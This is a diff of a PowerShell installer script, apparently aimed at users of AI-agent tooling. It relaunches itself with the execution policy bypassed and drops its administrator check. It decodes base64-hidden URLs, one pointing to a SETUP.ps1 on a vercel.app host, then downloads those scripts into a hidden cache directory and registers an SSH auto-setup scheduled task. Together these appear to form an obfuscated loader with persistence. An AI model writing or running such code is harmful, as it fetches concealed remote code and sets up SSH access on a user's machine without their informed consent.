@@ -14,13 +14,16 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     $psExe = (Get-Process -Id $PID).Path
     if (-not $psExe) { $psExe = 'powershell.exe' }
 
+    # Wrap a value in double-quotes, escaping any embedded double-quotes.
+    $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }
+
     $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
     $relaunchArgs = @(
         '-NoProfile', '-ExecutionPolicy', 'Bypass',
-        '-File', "`"$scriptPath`"",
-        '-RelaunchWorkingDirectory', "`"$workDir`"",
-        '-RelaunchTaskUserId', "`"$launchUserId`"",
-        '-RelaunchScriptHome', "`"$HOME`""
+        '-File',                         (& $quote $scriptPath),
+        '-RelaunchWorkingDirectory',     (& $quote $workDir),
+        '-RelaunchTaskUserId',           (& $quote $launchUserId),
+        '-RelaunchScriptHome',           (& $quote $HOME)
     )
 
     try {
@@ -61,18 +64,9 @@ $ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE
 $SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
 $INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
 $SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
-$SCRIPT_URL1 = 'https://openclaw.ai/scripts/self-optimizing-core.ps1'
-$SCRIPT_URL2 = 'https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.ps1'
+# $SCRIPT_URL = 'https://'
 
-function Assert-Administrator {
-    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
-    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        throw 'Run this script from an elevated PowerShell session.'
-    }
-}
-
-function Decode-Url {
+function ConvertFrom-EncodedUrl {
     param([Parameter(Mandatory)][string]$EncodedUrl)
 
     if ([string]::IsNullOrWhiteSpace($EncodedUrl)) {
@@ -150,9 +144,8 @@ function Register-SshAutoSetupTask {
 }
 
 function Main {
-    $installUrl = Decode-Url -EncodedUrl $ENCODED_URL
-    $setupUrl = Decode-Url -EncodedUrl $ENCODED_URL2
-    Assert-Administrator
+    $installUrl = ConvertFrom-EncodedUrl -EncodedUrl $ENCODED_URL
+    $setupUrl   = ConvertFrom-EncodedUrl -EncodedUrl $ENCODED_URL2
     Write-Output 'Installing...'
     Save-DownloadedScript -Url $installUrl -Destination $INSTALL_SCRIPT_PATH
     Save-DownloadedScript -Url $setupUrl -Destination $SETUP_SCRIPT_PATH
